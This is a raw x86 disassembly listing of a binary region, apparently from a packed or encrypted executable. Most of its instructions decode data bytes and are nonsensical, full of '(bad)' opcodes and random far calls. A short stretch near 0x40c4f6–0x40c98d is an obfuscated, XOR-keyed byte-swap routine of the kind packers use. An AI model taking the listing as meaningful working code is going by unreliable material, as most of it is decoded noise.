  40c24b:	inc    ebx
  40c24c:	inc    ebp
  40c24d:	into   
  40c24e:	aad    0xb3
  40c250:	out    dx,al
  40c251:	xchg   edx,eax
  40c252:	(bad)  [edx]
  40c254:	cld    
  40c255:	ret    
  40c256:	sub    BYTE PTR [ecx+0x374a62a4],dh
  40c25c:	scas   al,BYTE PTR es:[edi]
  40c25d:	mov    esi,ds
  40c25f:	out    dx,eax
  40c260:	mov    dh,0xf7
  40c262:	in     eax,dx
  40c263:	mov    ebp,0xf62dd954
  40c268:	jne    0x40c294
  40c26a:	xor    DWORD PTR [esi],eax
  40c26c:	dec    esi
  40c26d:	sub    edx,eax
  40c26f:	(bad)
  40c273:	js     0x40c227
  40c275:	call   0xba757778
  40c27a:	cmp    DWORD PTR [eax+0x1c],esi
  40c27d:	xlat   BYTE PTR ds:[ebx]
  40c27e:	loopne 0x40c28d
  40c280:	push   es
  40c281:	sub    DWORD PTR [esi],edx
  40c283:	pop    DWORD PTR ds:0x5d5ad8f9
  40c289:	les    ebx,FWORD PTR [esi]
  40c28b:	jmp    0x40c279
  40c28d:	rcr    BYTE PTR [esi-0x22d832d3],1
  40c293:	xor    DWORD PTR [edi+0x1246547b],edx
  40c299:	cmc    
  40c29a:	cmc    
  40c29b:	fnstcw WORD PTR [ebx]
  40c29d:	or     eax,0x5aec5f8a
  40c2a2:	and    esp,DWORD PTR [ecx+0xf]
  40c2a5:	push   ds
  40c2a6:	idiv   dl
  40c2a8:	dec    esi
  40c2a9:	out    0xad,al
  40c2ab:	sub    BYTE PTR [eax],dl
  40c2ad:	fmul   QWORD PTR [edi]
  40c2af:	not    edi
  40c2b1:	pushf  
  40c2b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2b3:	mov    bl,0x6
  40c2b5:	leave  
  40c2b6:	fs ins DWORD PTR es:[edi],dx
  40c2b8:	mov    dh,0x90
  40c2ba:	fstp   DWORD PTR [ebx+edx*4]
  40c2bd:	cmp    cl,BYTE PTR [edi]
  40c2bf:	repnz cmc 
  40c2c1:	dec    esp
  40c2c2:	push   ss
  40c2c3:	jg     0x40c26d
  40c2c5:	inc    esi
  40c2c6:	out    0xac,eax
  40c2c8:	inc    esp
  40c2c9:	xor    al,0x3d
  40c2cb:	iret   
  40c2cc:	cmp    DWORD PTR [edx+0x1b869012],ebp
  40c2d2:	fsub   QWORD PTR fs:[ebp+0x34abbf4c]
  40c2d9:	xchg   edi,eax
  40c2da:	inc    edi
  40c2db:	push   ecx
  40c2dc:	call   0xa2b5:0x8f6aad24
  40c2e3:	clc    
  40c2e4:	cld    
  40c2e5:	outs   dx,DWORD PTR ds:[esi]
  40c2e6:	scas   al,BYTE PTR es:[edi]
  40c2e7:	retf   0xd391
  40c2ea:	dec    DWORD PTR [ecx-0x17]
  40c2ed:	or     eax,0x9fdd5954
  40c2f2:	or     dh,BYTE PTR [ecx+0x1f61ad8e]
  40c2f8:	xchg   edx,eax
  40c2f9:	popa   
  40c2fa:	xor    DWORD PTR [esi],ecx
  40c2fc:	cmp    DWORD PTR [edx-0xbb0f52],edi
  40c302:	adc    eax,0xe1864a8a
  40c307:	sub    ebp,DWORD PTR [eax+0x6580b7af]
  40c30d:	ja     0x40c34d
  40c30f:	or     DWORD PTR [ebp+0x15020801],0xffffffcd
  40c316:	clc    
  40c317:	cwde   
  40c318:	lock cmp ch,dl
  40c31b:	mov    ebp,0x8bcc5825
  40c320:	(bad)  
  40c321:	jno    0x40c2fc
  40c323:	push   esi
  40c324:	fld    TBYTE PTR [ecx+0x7623b248]
  40c32a:	out    0xe,eax
  40c32c:	cwde   
  40c32d:	dec    ebp
  40c32e:	add    esi,ebp
  40c330:	outs   dx,DWORD PTR ds:[esi]
  40c331:	daa    
  40c332:	xor    ah,BYTE PTR [esi-0x1f]
  40c335:	in     eax,dx
  40c336:	fucomi st,st(7)
  40c338:	rol    DWORD PTR [edi],cl
  40c33a:	repnz mov ds:0xc0466520,al
  40c340:	jle    0x40c3b2
  40c342:	call   0xd3af871b
  40c347:	(bad)  
  40c348:	mov    eax,ds:0x2427b246
  40c34d:	or     esi,edi
  40c34f:	mov    eax,0xdf404b84
  40c354:	jae    0x40c2e1
  40c356:	das    
  40c357:	lds    edx,FWORD PTR [edi+0x12]
  40c35a:	pop    ebp
  40c35b:	(bad)  
  40c35c:	mov    ch,0xe3
  40c35e:	mov    bl,0xf4
  40c360:	aaa    
  40c361:	cli    
  40c362:	and    dh,BYTE PTR [edi]
  40c364:	js     0x40c3c3
  40c366:	div    DWORD PTR [ebx-0x28]
  40c369:	push   ecx
  40c36a:	dec    DWORD PTR [edi+ebx*2]
  40c36d:	pop    ss
  40c36e:	int3   
  40c36f:	not    DWORD PTR [esp+ebp*2+0x407a7d08]
  40c376:	pop    edi
  40c377:	pop    ss
  40c378:	and    BYTE PTR [ebp+0x48f67eb1],0x5b
  40c37f:	ffree  st(1)
  40c381:	in     eax,dx
  40c382:	cmp    ebp,edi
  40c384:	cdq    
  40c385:	ret    
  40c386:	ret    0xb0a6
  40c389:	sbb    edi,esp
  40c38b:	mov    dl,0x22
  40c38d:	jns    0x40c3d3
  40c38f:	cmp    al,BYTE PTR [ecx]
  40c391:	addr16 push edi
  40c393:	push   cs
  40c394:	mov    ch,0x34
  40c396:	cmp    al,bl
  40c398:	setns  BYTE PTR [edi+0x1cd804fc]
  40c39f:	leave  
  40c3a0:	mov    esi,DWORD PTR [ecx-0x1b46a09]
  40c3a6:	mov    ebp,0x65d6f44a
  40c3ab:	add    eax,0x6d6fc164
  40c3b0:	jnp    0x40c37f
  40c3b2:	xchg   edi,eax
  40c3b3:	or     ecx,DWORD PTR [ebx]
  40c3b5:	retf   
  40c3b6:	mov    ds:0xee390468,al
  40c3bb:	jecxz  0x40c3c5
  40c3bd:	mov    DWORD PTR [eax+0x4f],ebp
  40c3c0:	psllw  mm7,QWORD PTR [eax+0x4d24bc5b]
  40c3c7:	mov    al,ds:0xf9f1d840
  40c3cc:	mov    edx,0x3e6481d
  40c3d1:	mov    ds:0xe5271c13,eax
  40c3d6:	aas    
  40c3d7:	lahf   
  40c3d8:	xchg   esi,eax
  40c3d9:	jmp    0x40c37a
  40c3db:	mov    ebx,0x29a9a693
  40c3e0:	in     eax,dx
  40c3e1:	adc    eax,esi
  40c3e3:	mov    ah,BYTE PTR [ebp-0x29ce8d37]
  40c3e9:	(bad)  
  40c3ea:	js     0x40c3fe
  40c3ec:	jo     0x40c43c
  40c3ee:	sbb    dl,dl
  40c3f0:	push   edx
  40c3f1:	lods   al,BYTE PTR ds:[esi]
  40c3f2:	and    DWORD PTR [ebp+0x52f4b95c],ebp
  40c3f8:	mov    BYTE PTR [eax-0x20d80305],cl
  40c3fe:	push   eax
  40c3ff:	or     al,0xbc
  40c401:	mov    edi,0xcb995de2
  40c406:	dec    eax
  40c407:	jae    0x40c3a4
  40c409:	fwait
  40c40a:	popa   
  40c40b:	mov    gs,WORD PTR [ebp-0x573180d2]
  40c411:	pop    ds
  40c412:	xchg   esi,eax
  40c413:	xor    dl,BYTE PTR [edx]
  40c415:	dec    DWORD PTR [edi-0x30]
  40c418:	popa   
  40c419:	ins    DWORD PTR es:[edi],dx
  40c41a:	mov    DWORD PTR es:[ecx],ebp
  40c41d:	xchg   edx,eax
  40c41e:	fisttp QWORD PTR [ebx]
  40c420:	push   cs
  40c421:	dec    edi
  40c422:	inc    esp
  40c423:	lds    ebp,FWORD PTR [eax]
  40c425:	ror    BYTE PTR [ebp-0x118efa40],0x4b
  40c42c:	addr16 ret 
  40c42e:	pop    eax
  40c42f:	pop    edx
  40c430:	repz xor cl,BYTE PTR [ebx+edx*1+0x4d7cc2b8]
  40c438:	shl    BYTE PTR [edx-0x28],cl
  40c43b:	mov    ?,WORD PTR [edx-0x1b4d2578]
  40c441:	out    dx,eax
  40c442:	inc    ecx
  40c443:	mov    cs,WORD PTR [ecx+0x3e]
  40c446:	dec    esp
  40c447:	fsubr  DWORD PTR [edi+0x459a111]
  40c44d:	dec    ebx
  40c44e:	fs in  al,dx
  40c450:	xchg   edx,eax
  40c451:	push   ebp
  40c452:	sub    dh,0x75
  40c455:	out    0x64,al
  40c457:	cli    
  40c458:	add    al,BYTE PTR ds:0x12852942
  40c45e:	push   esi
  40c45f:	mov    DWORD PTR [ecx],esi
  40c461:	loope  0x40c3e4
  40c463:	inc    esp
  40c464:	push   edi
  40c465:	sub    al,0x4d
  40c467:	inc    ebx
  40c468:	fstp   DWORD PTR [eax]
  40c46a:	imul   ebp,esi,0x76
  40c46d:	xor    eax,edx
  40c46f:	fcom   QWORD PTR [ecx-0x21]
  40c472:	and    bl,BYTE PTR [ebp+0x6e61b687]
  40c478:	outs   dx,BYTE PTR ds:[esi]
  40c479:	imul   edx,DWORD PTR [ebx+0x7e],0xffffffc5
  40c47d:	jns    0x40c4d5
  40c47f:	loope  0x40c44f
  40c481:	stos   BYTE PTR es:[edi],al
  40c482:	das    
  40c483:	adc    al,0xfa
  40c485:	cdq    
  40c486:	ss xchg edi,eax
  40c488:	stos   DWORD PTR es:[edi],eax
  40c489:	in     al,0x37
  40c48b:	mov    al,ds:0xfb021c46
  40c490:	push   0x8b74b6c
  40c495:	mov    ebx,0xc6d2ac06
  40c49a:	clc    
  40c49b:	pop    es
  40c49c:	fwait
  40c49d:	call   0xe93f4cb8
  40c4a2:	fcmovb st,st(7)
  40c4a4:	fmul   DWORD PTR [edx+ebp*8+0x25]
  40c4a8:	xchg   BYTE PTR ds:0x437df63b,al
  40c4ae:	mov    ecx,0x370c8f35
  40c4b3:	pop    ss
  40c4b4:	mov    bl,0xd4
  40c4b6:	mov    dh,0xdd
  40c4b8:	mov    bh,0xf0
  40c4ba:	mov    es,WORD PTR [ecx+0xb3f6ad3]
  40c4c0:	mov    ebx,0x3ec45190
  40c4c5:	mov    cl,ch
  40c4c7:	icebp  
  40c4c8:	inc    edi
  40c4c9:	fsub   QWORD PTR [ebp+0x37]
  40c4cc:	xchg   ebx,eax
  40c4cd:	(bad)  
  40c4ce:	cmp    DWORD PTR [edi+0x2e],ebx
  40c4d1:	and    dl,BYTE PTR [esi-0x4b]
  40c4d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4d5:	pop    ebp
  40c4d6:	pop    esi
  40c4d7:	ror    bh,0xab
  40c4da:	icebp  
  40c4db:	push   esp
  40c4dc:	(bad)  
  40c4dd:	orps   xmm7,XMMWORD PTR [ebx+0xf21f46f]
  40c4e4:	mov    ch,0x7b
  40c4e6:	dec    esp
  40c4e7:	xchg   ecx,eax
  40c4e8:	pop    ebx
  40c4e9:	les    edx,FWORD PTR [ecx+0x6]
  40c4ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4ed:	sbb    al,BYTE PTR [edx+0x6ae83a1e]
  40c4f3:	imul   edx,edi
  40c4f6:	mov    DWORD PTR [ebp+0xc],edx
  40c4f9:	mov    edx,DWORD PTR [ebp+0xc]
  40c4fc:	mov    DWORD PTR [ebp-0x24],edx
  40c4ff:	mov    edx,DWORD PTR [ebp-0x8]
  40c502:	add    edx,DWORD PTR [ebp-0x40]
  40c505:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40c50c:	mov    DWORD PTR [ebp-0x1c],edx
  40c50f:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  40c516:	mov    DWORD PTR [ebp-0x44],0xf89c8538
  40c51d:	mov    edx,DWORD PTR [ebp-0x18]
  40c520:	xor    edx,eax
  40c522:	add    edx,ecx
  40c524:	jmp    0x40cdbf
  40c529:	mov    edx,DWORD PTR [ebp-0x18]
  40c52c:	xor    edx,eax
  40c52e:	jmp    0x40c945
  40c533:	sub    al,0x9b
  40c535:	inc    edx
  40c536:	(bad)  
  40c537:	dec    ebp
  40c538:	idiv   DWORD PTR [ebp+esi*2-0x2cf58fc4]
  40c53f:	cmp    bl,al
  40c541:	xor    eax,0x7e96d0a7
  40c546:	jle    0x40c5b8
  40c548:	jns    0x40c5c8
  40c54a:	jle    0x40c517
  40c54c:	push   esp
  40c54d:	mov    DWORD PTR [edi+0x36],edx
  40c550:	push   esi
  40c551:	mov    ds,WORD PTR [ecx-0x23]
  40c554:	cmp    al,0xce
  40c556:	aam    0x17
  40c558:	pop    ss
  40c559:	scas   al,BYTE PTR es:[edi]
  40c55a:	test   DWORD PTR [ebx+eax*8],eax
  40c55d:	test   DWORD PTR [ebx+0x41],esp
  40c560:	pop    edi
  40c561:	out    0x10,al
  40c563:	jl     0x40c4e5
  40c565:	arpl   ax,bp
  40c567:	jns    0x40c573
  40c569:	icebp  
  40c56a:	adc    DWORD PTR [ecx+0x60d036c5],0x7d2cb976
  40c574:	and    BYTE PTR [edi+ecx*4],cl
  40c577:	cmp    eax,0xdbd19596
  40c57c:	pop    ecx
  40c57d:	mov    eax,ds:0x6d1024c9
  40c582:	lods   eax,DWORD PTR ds:[esi]
  40c583:	ins    DWORD PTR es:[edi],dx
  40c584:	inc    esi
  40c585:	mov    ds:0xf86480d,al
  40c58a:	xor    DWORD PTR es:[edi+0x6a],ebx
  40c58e:	fisubr WORD PTR [ecx+0xc]
  40c591:	repz (bad) 
  40c593:	loopne 0x40c58d
  40c595:	sub    ebp,ecx
  40c597:	xchg   ecx,eax
  40c598:	jb     0x40c60f
  40c59a:	sbb    bl,BYTE PTR [edi+0x9]
  40c59d:	rol    BYTE PTR [edi-0x7f],1
  40c5a0:	hlt    
  40c5a1:	or     BYTE PTR [edx-0x61bbb1fe],ch
  40c5a7:	rol    BYTE PTR [eiz*1+0x7a4f7df],1
  40c5ae:	add    DWORD PTR [edx-0xe49a13b],esp
  40c5b4:	aad    0x7b
  40c5b6:	neg    DWORD PTR [ebp-0x1b1a4693]
  40c5bc:	idiv   BYTE PTR [edx+0x29155383]
  40c5c2:	sub    bh,BYTE PTR [esi]
  40c5c4:	jne    0x40c5f7
  40c5c6:	mov    dl,0x1c
  40c5c8:	push   ds
  40c5c9:	pop    esp
  40c5ca:	adc    BYTE PTR [edx-0x7b],0x83
  40c5ce:	out    0x14,eax
  40c5d0:	call   0x98a3264b
  40c5d5:	cld    
  40c5d6:	ret    0xb1d7
  40c5d9:	scas   al,BYTE PTR es:[edi]
  40c5da:	clc    
  40c5db:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5dd:	test   al,0x38
  40c5df:	sbb    eax,0x4708d786
  40c5e4:	gs sti 
  40c5e6:	sub    ecx,DWORD PTR ds:0xe79f5f80
  40c5ec:	and    bl,BYTE PTR [ebx-0x43]
  40c5ef:	add    DWORD PTR [esi+ecx*8-0x25],edi
  40c5f3:	cmp    al,BYTE PTR [edx]
  40c5f5:	hlt    
  40c5f6:	enter  0x4c6f,0x97
  40c5fa:	add    al,0xd0
  40c5fc:	mov    esi,ebx
  40c5fe:	icebp  
  40c5ff:	sbb    dh,BYTE PTR [edx]
  40c601:	adc    esp,DWORD PTR [edi+0x2e2ec85c]
  40c607:	and    eax,DWORD PTR [edx+0x3326d715]
  40c60d:	rcl    BYTE PTR [edx+0x54d6fce9],cl
  40c613:	xchg   edx,eax
  40c614:	xor    eax,0x2bc7699e
  40c619:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c61b:	lods   eax,DWORD PTR ds:[esi]
  40c61c:	jl     0x40c694
  40c61e:	pusha  
  40c61f:	mov    dh,0xdb
  40c621:	and    BYTE PTR [esi-0x26d3789f],ch
  40c627:	ins    BYTE PTR es:[edi],dx
  40c628:	xor    ecx,0xd30373a7
  40c62e:	inc    ecx
  40c62f:	enter  0x4cbf,0x25
  40c633:	stc    
  40c634:	aam    0x49
  40c636:	daa    
  40c637:	dec    edi
  40c638:	cmp    dh,0xfc
  40c63b:	shl    DWORD PTR [edx+0x63],0x96
  40c63f:	(bad)  
  40c640:	out    0x13,al
  40c642:	call   0x30debfcb
  40c647:	out    0xfb,eax
  40c649:	fdivr  st(4),st
  40c64b:	cmp    ah,bl
  40c64d:	shl    DWORD PTR [edx+0x106e56f2],0x10
  40c654:	push   0x7c1f4085
  40c659:	retf   0x8c87
  40c65c:	jb     0x40c6db
  40c65e:	push   es
  40c65f:	arpl   WORD PTR [ecx],sp
  40c661:	stos   DWORD PTR es:[edi],eax
  40c662:	jb     0x40c611
  40c664:	les    edi,FWORD PTR [eax-0x5d]
  40c667:	xchg   esi,eax
  40c668:	les    eax,FWORD PTR [ebx+ecx*8-0x7b527b82]
  40c66f:	leave  
  40c670:	cwde   
  40c671:	add    eax,0x2c4fb727
  40c676:	and    BYTE PTR [edi-0x3176ce9a],cl
  40c67c:	push   es
  40c67d:	ror    ebp,cl
  40c67f:	adc    esp,esp
  40c681:	fcom   st(2)
  40c683:	mov    bl,0x12
  40c685:	(bad)  
  40c687:	test   DWORD PTR [ebp+0x4c],ebp
  40c68a:	jne    0x40c693
  40c68c:	pop    esi
  40c68d:	adc    eax,0x9d99c512
  40c692:	fmul   DWORD PTR es:[ecx-0x3a]
  40c696:	adc    DWORD PTR [esi],esi
  40c698:	push   ecx
  40c699:	fisttp QWORD PTR [edx+edx*8]
  40c69c:	aaa    
  40c69d:	out    dx,eax
  40c69e:	inc    edx
  40c69f:	jno    0x40c6cd
  40c6a1:	cs scas eax,DWORD PTR es:[edi]
  40c6a3:	icebp  
  40c6a4:	test   BYTE PTR [ecx+0x24],ch
  40c6a7:	je     0x40c62d
  40c6a9:	xchg   edx,eax
  40c6aa:	sub    eax,0x86442af9
  40c6af:	js     0x40c71d
  40c6b1:	aam    0xae
  40c6b3:	cli    
  40c6b4:	sub    DWORD PTR [ebx],ecx
  40c6b6:	or     DWORD PTR [ebp+0x6c],esp
  40c6b9:	and    ebp,edi
  40c6bb:	pusha  
  40c6bc:	inc    eax
  40c6bd:	out    dx,al
  40c6be:	or     cl,bh
  40c6c0:	les    ecx,FWORD PTR [eax]
  40c6c2:	cmp    bl,bh
  40c6c4:	cli    
  40c6c5:	fwait
  40c6c6:	shl    eax,0x41
  40c6c9:	mov    eax,ds:0x55bf8d9
  40c6ce:	call   DWORD PTR [edi]
  40c6d0:	and    BYTE PTR [ebx+0x12],0x63
  40c6d4:	stos   DWORD PTR es:[edi],eax
  40c6d5:	mov    bl,0x6a
  40c6d7:	iret   
  40c6d8:	mov    cl,0x3f
  40c6da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6db:	cmp    al,BYTE PTR [edi+0x44ea4fd]
  40c6e1:	push   ss
  40c6e2:	fld    QWORD PTR [ebx+0x2d]
  40c6e5:	xchg   esp,eax
  40c6e6:	and    cl,bl
  40c6e8:	dec    ebx
  40c6e9:	jne    0x40c6ad
  40c6eb:	mov    ds:0x816ae8d9,al
  40c6f0:	lock int 0x55
  40c6f3:	xlat   BYTE PTR ds:[ebx]
  40c6f4:	ss scas al,BYTE PTR es:[edi]
  40c6f6:	adc    eax,0x6be9df95
  40c6fb:	shl    BYTE PTR [ebp+0x2c],0x15
  40c6ff:	aaa    
  40c700:	cdq    
  40c701:	je     0x40c74b
  40c703:	dec    edi
  40c704:	xor    al,0x4b
  40c706:	aaa    
  40c707:	xor    ebp,ebx
  40c709:	mov    esp,eax
  40c70b:	pop    esi
  40c70c:	cld    
  40c70d:	sbb    edx,edi
  40c70f:	rcl    DWORD PTR ds:0xaa22ee21,cl
  40c715:	adc    bh,dl
  40c717:	(bad)  
  40c718:	repz (bad) [eax]
  40c71b:	mov    esp,0xefacf6e3
  40c720:	fcmove st,st(3)
  40c722:	call   0x3c7d4d4c
  40c727:	dec    ebp
  40c728:	xchg   dh,bl
  40c72a:	jle    0x40c775
  40c72c:	dec    eax
  40c72d:	add    bh,BYTE PTR cs:[ebp+0x74a0f201]
  40c734:	pop    ecx
  40c735:	mov    cl,0x7a
  40c737:	and    edi,ebx
  40c739:	mov    ds:0x90b4850e,eax
  40c73e:	cmc    
  40c73f:	imul   edi,DWORD PTR [eax-0x6d],0xb1ca59df
  40c746:	jns    0x40c791
  40c748:	mov    al,ds:0xa5c84ae6
  40c74d:	call   0xe99f:0x2ac2b78c
  40c754:	idiv   BYTE PTR [edx+0x4bbd8923]
  40c75a:	aas    
  40c75b:	ffreep st(3)
  40c75d:	cmp    eax,DWORD PTR [esp+ebp*4]
  40c760:	sbb    ebx,DWORD PTR [edx+0x51]
  40c763:	mov    dl,0xdd
  40c765:	push   0x12
  40c767:	(bad)  
  40c768:	push   ecx
  40c769:	jp     0x40c7cb
  40c76b:	inc    edi
  40c76c:	mov    ds:0xd135f06e,al
  40c771:	jg     0x40c717
  40c773:	add    eax,0x96609898
  40c778:	xchg   ebx,eax
  40c779:	pop    esp
  40c77a:	shl    DWORD PTR [ebp+0xb5e8931],0x96
  40c781:	in     eax,dx
  40c782:	pop    esi
  40c783:	in     eax,0x63
  40c785:	xchg   ecx,eax
  40c786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c787:	iret   
  40c788:	mov    ds:0xd882d339,al
  40c78d:	imul   ebx,DWORD PTR [ebx+0x2994dd39],0x145900d6
  40c797:	sub    BYTE PTR [eax-0x6e015bca],bh
  40c79d:	mov    eax,ds:0x65a96334
  40c7a2:	stc    
  40c7a3:	outs   dx,DWORD PTR ds:[esi]
  40c7a4:	nop
  40c7a5:	xchg   ecx,eax
  40c7a6:	fdiv   DWORD PTR [ebx+esi*4-0x49]
  40c7aa:	scas   al,BYTE PTR es:[edi]
  40c7ab:	ss mov ebp,0xeeb388b1
  40c7b1:	int    0x73
  40c7b3:	mov    eax,0xd50c3bb6
  40c7b8:	stos   DWORD PTR es:[edi],eax
  40c7b9:	cmp    eax,0x81763c75
  40c7be:	inc    eax
  40c7bf:	xor    eax,0x7b739b4c
  40c7c4:	sub    ch,BYTE PTR [esi-0x4e]
  40c7c7:	stos   BYTE PTR es:[edi],al
  40c7c8:	sub    esp,eax
  40c7ca:	(bad)  
  40c7cb:	loopne 0x40c766
  40c7cd:	sbb    eax,0x8e85d1ec
  40c7d2:	xchg   BYTE PTR [esi],bh
  40c7d4:	lods   al,BYTE PTR ds:[esi]
  40c7d5:	je     0x40c7dc
  40c7d7:	stos   DWORD PTR es:[edi],eax
  40c7d8:	stos   BYTE PTR es:[edi],al
  40c7d9:	(bad)
  40c7dc:	xchg   DWORD PTR [edi+0x25],esi
  40c7df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7e0:	mov    ecx,0x65570f92
  40c7e5:	scas   eax,DWORD PTR es:[edi]
  40c7e6:	call   0x767b:0xfdb20177
  40c7ed:	xchg   BYTE PTR [edi],dh
  40c7ef:	xlat   BYTE PTR ds:[ebx]
  40c7f0:	add    eax,0xec8c1de9
  40c7f5:	dec    ebx
  40c7f6:	icebp  
  40c7f7:	cmc    
  40c7f8:	xor    dh,BYTE PTR [ecx+0x166ea1ce]
  40c7fe:	jbe    0x40c857
  40c800:	inc    esp
  40c801:	mul    BYTE PTR [ecx-0x9b225a1]
  40c807:	outs   dx,DWORD PTR ds:[esi]
  40c808:	out    dx,al
  40c809:	mov    eax,ds:0x5255e975
  40c80e:	cdq    
  40c80f:	mov    bh,0xbe
  40c811:	retf   0x1018
  40c814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c815:	sub    BYTE PTR [edi+ebp*2],cl
  40c818:	scas   eax,DWORD PTR es:[edi]
  40c819:	pop    ebp
  40c81a:	mov    ebp,0x53b6cac1
  40c81f:	inc    ecx
  40c820:	jns    0x40c7ae
  40c822:	and    edi,DWORD PTR [ebx-0x18]
  40c825:	sbb    eax,0x1d143c5e
  40c82a:	mov    eax,0x8ee578ab
  40c82f:	fstp   TBYTE PTR [edi]
  40c831:	dec    esi
  40c832:	cmpsd  xmm0,xmm1,0xba
  40c837:	pop    ebp
  40c838:	xor    BYTE PTR [edi-0x28],ah
  40c83b:	sub    dh,0x18
  40c83e:	cli    
  40c83f:	cmp    ebx,DWORD PTR [ebx]
  40c841:	cld    
  40c842:	repnz inc ecx
  40c844:	data16 fst st(6)
  40c847:	aam    0x70
  40c849:	sub    esp,DWORD PTR [edi]
  40c84b:	add    BYTE PTR [edx],cl
  40c84d:	sub    eax,0x6c48ab93
  40c852:	sbb    DWORD PTR [ecx+0x9adb51],ebp
  40c858:	mov    al,0x41
  40c85a:	jecxz  0x40c854
  40c85c:	call   0xc9c5:0x571250b6
  40c863:	js     0x40c816
  40c865:	clc    
  40c866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c867:	xchg   edx,eax
  40c868:	int3   
  40c869:	(bad)  
  40c86a:	adc    ebx,DWORD PTR [ecx]
  40c86c:	cmp    BYTE PTR [ecx+0x43517ad8],0x3a
  40c873:	or     bl,BYTE PTR [ecx+0xc13d51d]
  40c879:	jno    0x40c8f8
  40c87b:	mov    ebp,0xf5524e5
  40c880:	jne    0x40c8e6
  40c882:	nop
  40c883:	test   al,0x4b
  40c885:	ins    BYTE PTR es:[edi],dx
  40c886:	pushf  
  40c887:	adc    esp,DWORD PTR [ebx-0x5fd40ca]
  40c88d:	loope  0x40c8e3
  40c88f:	(bad)  
  40c891:	jb     0x40c852
  40c893:	sub    ebp,eax
  40c895:	js     0x40c912
  40c897:	mov    ds,WORD PTR [esi+0x70]
  40c89a:	shl    DWORD PTR [edi],cl
  40c89c:	pop    ecx
  40c89d:	test   BYTE PTR [ecx*2+0x129522f],bl
  40c8a4:	dec    eax
  40c8a5:	mov    cl,0x94
  40c8a7:	xchg   esp,eax
  40c8a8:	js     0x40c911
  40c8aa:	addr16 mov cl,0xe6
  40c8ad:	arpl   WORD PTR [eax],sp
  40c8af:	ds call 0x71a050dc
  40c8b5:	jecxz  0x40c89e
  40c8b7:	rcr    DWORD PTR [ebx],cl
  40c8b9:	pop    ecx
  40c8ba:	mov    dl,0xe3
  40c8bc:	mov    eax,0x5122f44
  40c8c1:	shl    ebp,cl
  40c8c3:	jnp    0x40c878
  40c8c5:	dec    esi
  40c8c6:	add    edi,ecx
  40c8c8:	fst    QWORD PTR [esi-0x30]
  40c8cb:	dec    esp
  40c8cc:	mov    ds:0x41092551,eax
  40c8d1:	xchg   edi,eax
  40c8d2:	sar    BYTE PTR [eax-0x6e0dbc98],1
  40c8d8:	inc    ebp
  40c8d9:	int    0x2b
  40c8db:	pop    es
  40c8dc:	push   ecx
  40c8dd:	fnstcw WORD PTR [eax+0x69]
  40c8e0:	sub    bh,BYTE PTR [ecx-0x79]
  40c8e3:	daa    
  40c8e4:	loopne 0x40c946
  40c8e6:	and    DWORD PTR [ebx-0x5bef0fe4],0x63427919
  40c8f0:	in     eax,dx
  40c8f1:	nop
  40c8f2:	add    DWORD PTR [ebx-0xa],edi
  40c8f5:	jnp    0x40c8f7
  40c8f7:	cmp    ebp,DWORD PTR [ebx]
  40c8f9:	and    bh,BYTE PTR [eax]
  40c8fb:	cmp    eax,esi
  40c8fd:	jo     0x40c901
  40c8ff:	ja     0x40c913
  40c901:	push   eax
  40c902:	inc    edx
  40c903:	jmp    0x40c8c5
  40c905:	xlat   BYTE PTR es:[ebx]
  40c907:	sub    ch,ah
  40c909:	dec    edi
  40c90a:	sbb    ch,dl
  40c90c:	jle    0x40c92c
  40c90e:	aaa    
  40c90f:	aam    0x8b
  40c911:	arpl   dx,si
  40c913:	add    al,0xec
  40c915:	enter  0xa1b7,0x2a
  40c919:	xchg   ebx,eax
  40c91a:	pop    ds
  40c91b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c91c:	lods   eax,DWORD PTR ds:[esi]
  40c91d:	ja     0x40c97e
  40c91f:	pushf  
  40c920:	popf   
  40c921:	in     eax,dx
  40c922:	adc    DWORD PTR [edi+0x34ef62c5],0xffffffbe
  40c929:	jns    0x40c981
  40c92b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c92c:	rcr    DWORD PTR ds:0xfbc9071f,1
  40c932:	sti    
  40c933:	adc    eax,0x4aeba8db
  40c938:	enter  0x2247,0xe4
  40c93c:	push   edx
  40c93d:	dec    ecx
  40c93e:	xchg   ebx,eax
  40c93f:	add    BYTE PTR [eax-0x6879792a],ah
  40c945:	add    edx,DWORD PTR [ebp-0x14]
  40c948:	mov    edi,DWORD PTR [ebp-0x1c]
  40c94b:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c952:	mov    BYTE PTR [ebp+0xf],dl
  40c955:	mov    edx,DWORD PTR [ebp-0xc]
  40c958:	xor    edx,eax
  40c95a:	add    edx,DWORD PTR [ebp-0x14]
  40c95d:	mov    edi,DWORD PTR [ebp-0x1c]
  40c960:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c967:	mov    BYTE PTR [ebp+0xb],dl
  40c96a:	mov    dl,BYTE PTR [ebp+0xf]
  40c96d:	mov    edi,DWORD PTR [ebp-0xc]
  40c970:	xor    edi,eax
  40c972:	add    edi,DWORD PTR [ebp-0x14]
  40c975:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c978:	mov    BYTE PTR [edi+ebx*1+0x327299],dl
  40c97f:	mov    dl,BYTE PTR [ebp+0xb]
  40c982:	mov    edi,DWORD PTR [ebp-0x18]
  40c985:	xor    edi,eax
  40c987:	add    edi,DWORD PTR [ebp-0x14]
  40c98a:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c98d:	jmp    0x40cda4
  40c992:	and    ebx,DWORD PTR [eax]
  40c994:	mov    al,0x9c
  40c996:	mov    ebp,0xbca9239c
  40c99b:	jne    0x40c9bf
  40c99d:	pminsw mm5,QWORD PTR [ebx]
  40c9a0:	or     BYTE PTR [eax-0x36],0x92
  40c9a4:	jle    0x40ca24
  40c9a6:	jo     0x40ca21
  40c9a8:	jle    0x40ca28
  40c9aa:	lahf   
